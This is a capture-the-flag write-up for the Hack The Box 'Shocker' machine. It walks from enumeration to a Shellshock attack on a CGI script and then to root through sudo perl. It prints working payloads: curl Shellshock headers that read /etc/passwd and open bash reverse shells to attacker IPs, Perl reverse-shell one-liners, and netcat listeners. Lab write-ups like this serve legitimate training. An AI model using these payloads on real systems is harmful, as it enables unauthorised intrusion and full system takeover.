# Shocker HTB, IP 10.10.10.56

# Initial Enumeration

**1.nmap -sC -sV 10.10.10.56**

![s1](https://user-images.githubusercontent.com/15195048/93921771-e3461800-fcc5-11ea-9c1f-4603b308f9a2.png)

**2../nmapAutomator.sh 10.10.10.56 All**

![s2](https://user-images.githubusercontent.com/15195048/93921775-e3deae80-fcc5-11ea-9136-bb83c7c48c81.png)

![s3](https://user-images.githubusercontent.com/15195048/93921776-e4774500-fcc5-11ea-981f-3010e02ea3aa.png)

**3. Dirb/ Gobuster**

**dirb http://10.10.10.56/cgi-bin -X .sh,.php,.cgi**
 
  The **cgi-bin** directory is a directory stored on the server which compiles and executes (typically) perl and shell scripts, rather than store them as basic HTML docs and whatnot.
  
 ![s4](https://user-images.githubusercontent.com/15195048/93921778-e4774500-fcc5-11ea-9b12-c01ffa49b47a.png)

  
  
I found a user.sh. We will try to exploit shellshock vulnerability on the server.
CGI runs bash as their default request handler and this attack does not require any authentication that’s why most of the attack is taken place on CGI pages to exploit this vulnerability.

------------------------------------------------------------------------------------------------------------------------------------------
# Port Enumeration

**1.Enumerating on port 80**


![s5](https://user-images.githubusercontent.com/15195048/93921779-e50fdb80-fcc5-11ea-9307-03456e2479ab.png)


**Image enumeration**
**wget http://10.10.10.56/bug.jpg**
**exiftool bug.jpg**

![s6](https://user-images.githubusercontent.com/15195048/93921781-e50fdb80-fcc5-11ea-915e-8c5f78ef2280.png)

Nothing here!

## 1.Exploit shellshock with curl
 
1.  **curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh**

2.  **curl -H ‘User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.3/4488 0>&1’ http://10.10.10.56:80/cgi-bin/user.sh**


## 2.Exploit shellshock with python script

**searchsploit shellshock**
 
We get a lot of results back but the one we’re interested in is 34900.py, an Apache mod_cgi script. Before we run it let’s verify it’s a legitimate script and the parameters we need to include by reading it on the exploit db. Since it looks good let’s go ahead and copy the exploit into our root folder and try to execute it.
 
 ![s7](https://user-images.githubusercontent.com/15195048/93921783-e5a87200-fcc5-11ea-98d6-78d04d7c0807.png)

 **python Desktop/cgi.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.24 lport=1337 pages=/cgi-bin/user.sh**
 
![s8](https://user-images.githubusercontent.com/15195048/93921787-e6d99f00-fcc5-11ea-83d4-88278f23a861.png)


**Notes:**
**Kill process in case of sockets in use**


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo netstat -nlp | grep 8069
ps -aux
tcp        0      0 0.0.0.0:8069            0.0.0.0:*               LISTEN      10869/python2    
sudo kill -9 10869
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 ![s9](https://user-images.githubusercontent.com/15195048/93921788-e7723580-fcc5-11ea-8f4a-cc9b610fa776.png)

 
**Interactive shell**
**python3 -c 'import pty; pty.spawn("/bin/bash")'**
In case that I wont be able to get an interactive shell I could get a reverse shell in order to be more stable.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ bash -i >& /dev/tcp/10.10.14.15/8888 0>&1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


**Attacker:**
nc -lvp 8888

![s10](https://user-images.githubusercontent.com/15195048/93921789-e80acc00-fcc5-11ea-84c5-ca5685ec2385.png)

----------------------------------------------------------------------------------------------------------------------------------------------
# Privilege escalation
**sudo -l**
 
 ![s11](https://user-images.githubusercontent.com/15195048/93921792-e8a36280-fcc5-11ea-987f-5490cf84d081.png)



## 1.GTFobins Perl
Linux for Perl resource:https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 perl -e 'exec "/bin/sh";'
 perl -e 'exec "tail /etc/passwd";'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 ![s12](https://user-images.githubusercontent.com/15195048/93921794-e9d48f80-fcc5-11ea-9a03-bb21ae5b5410.png)

 cat root/root.txt
 
 
## 2.Perl Reverse shell - one -Liner

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 $ sudo perl -e 'use Socket;$i="10.10.14.15";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 or

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 perl -e 'use Socket;$i="192.168.29.157";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Attacker:
nc -lvp 1234

 root.txt
 
